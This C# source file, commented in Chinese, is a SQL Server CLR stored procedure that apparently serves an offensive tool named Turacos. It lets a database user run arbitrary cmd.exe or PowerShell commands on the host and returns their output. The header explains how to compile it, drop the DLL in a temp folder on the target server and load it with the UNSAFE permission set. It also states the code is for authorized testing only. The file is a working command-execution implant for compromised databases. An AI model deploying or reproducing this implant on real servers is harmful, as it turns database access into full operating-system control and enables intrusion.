// ============================================================================
// ClrExec.cs — SQL Server CLR 参考实现（配合 Turacos MSSQL "CLR" 执行方式）
// ============================================================================
// 用途：为已授权目标提供 CLR 命令执行能力（创建程序集 [ClrExec] 并映射
//       dbo.clr_exec 存储过程，EXTERNAL NAME [ClrExec].[StoredProcedures].[Exec]）。
//
// 编译（Windows，.NET Framework 4.x 或 .NET SDK 均可）：
//   方法 A（.NET Framework，随机器自带 csc 或 VS 开发者命令行）：
//     csc /target:library /out:ClrExec.dll ClrExec.cs
//   方法 B（.NET SDK）：
//     dotnet build -c Release  (需 csproj，见下方注释)
//
// 使用：
//   1. 将编译产物 ClrExec.dll 放到目标服务器 C:\Windows\Temp\ 或 /tmp；
//   2. Turacos MSSQL 页选择 "CLR" 方式执行命令即可（自动枚举上述路径并加载）。
//
// 注意：PERMISSION_SET = UNSAFE 仅用于授权测试环境；
//       生产环境应优先使用受限权限集并严格审计程序集。
// ============================================================================

using System;
using System.Diagnostics;
using System.IO;

public static class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void Exec(string cmd)
    {
        try
        {
            string output = RunCommand(cmd);
            Microsoft.SqlServer.Server.SqlContext.Pipe.Send(output);
        }
        catch (Exception ex)
        {
            Microsoft.SqlServer.Server.SqlContext.Pipe.Send("[-] ERROR: " + ex.Message);
        }
    }

    private static string RunCommand(string command)
    {
        string fileName = "cmd.exe";
        string arguments = "/c " + command;

        // 允许直接以 exe 绝对路径调用（含空格）或 powershell
        if (command.StartsWith("\"", StringComparison.Ordinal) &&
            command.EndsWith("\"", StringComparison.Ordinal))
        {
            fileName = command.Trim('"');
            arguments = "";
        }
        else if (command.ToLower().StartsWith("powershell"))
        {
            fileName = "powershell.exe";
            arguments = command.Substring("powershell".Length).TrimStart();
        }

        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true
        };
        using (var p = Process.Start(psi))
        {
            string stdout = p.StandardOutput.ReadToEnd();
            string stderr = p.StandardError.ReadToEnd();
            p.WaitForExit();
            return stdout + stderr;
        }
    }
}
